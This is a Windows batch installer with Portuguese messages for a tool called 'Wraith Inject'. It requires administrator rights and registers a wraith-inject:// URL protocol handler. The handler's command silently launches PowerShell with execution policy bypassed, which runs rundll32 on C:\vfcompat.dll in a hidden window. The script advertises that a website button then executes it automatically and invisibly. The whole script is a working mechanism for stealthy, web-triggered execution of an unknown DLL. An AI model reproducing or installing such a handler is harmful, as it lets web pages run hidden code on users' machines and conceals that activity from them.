@echo off
chcp 65001 >nul
color 0A
title Wraith Inject - Instalador de Protocol Handler

echo.
echo ═══════════════════════════════════════════════
echo   🔥 WRAITH INJECT - PROTOCOL HANDLER
echo ═══════════════════════════════════════════════
echo.
echo 📦 Instalando protocol handler no Windows...
echo.

REM Verificar se está rodando como Admin
net session >nul 2>&1
if %errorLevel% neq 0 (
    echo ❌ ERRO: Execute como Administrador!
    echo.
    echo 👉 Clique com botão direito e selecione:
    echo    "Executar como administrador"
    echo.
    pause
    exit /b 1
)

echo ✅ Permissões de administrador detectadas
echo.

REM Registrar protocol handler
echo 📝 Registrando wraith-inject:// no registro...
reg add "HKEY_CLASSES_ROOT\wraith-inject" /ve /t REG_SZ /d "URL:Wraith Inject Protocol" /f >nul 2>&1
reg add "HKEY_CLASSES_ROOT\wraith-inject" /v "URL Protocol" /t REG_SZ /d "" /f >nul 2>&1
reg add "HKEY_CLASSES_ROOT\wraith-inject\DefaultIcon" /ve /t REG_SZ /d "C:\Windows\System32\shell32.dll,1" /f >nul 2>&1
reg add "HKEY_CLASSES_ROOT\wraith-inject\shell\open\command" /ve /t REG_SZ /d "\"C:\Windows\System32\cmd.exe\" /c start /min powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -Command \"Start-Process -WindowStyle Hidden -FilePath 'rundll32.exe' -ArgumentList 'C:\vfcompat.dll,windowssupport' -NoNewWindow\"" /f >nul 2>&1

if %errorLevel% equ 0 (
    echo ✅ Protocol handler registrado com sucesso!
) else (
    echo ❌ Erro ao registrar protocol handler
    pause
    exit /b 1
)

echo.
echo ═══════════════════════════════════════════════
echo   ✅ INSTALAÇÃO CONCLUÍDA!
echo ═══════════════════════════════════════════════
echo.
echo 📱 Como usar:
echo.
echo 1️⃣  Acesse o site no celular ou PC
echo 2️⃣  Clique em "Injetar"
echo 3️⃣  O comando será executado automaticamente!
echo.
echo 🎯 O protocol handler wraith-inject:// está ativo
echo.
echo ⚠️  IMPORTANTE:
echo    • Não precisa rodar nenhum servidor!
echo    • Funciona direto do navegador!
echo    • Totalmente invisível!
echo.
echo ═══════════════════════════════════════════════
echo.

pause
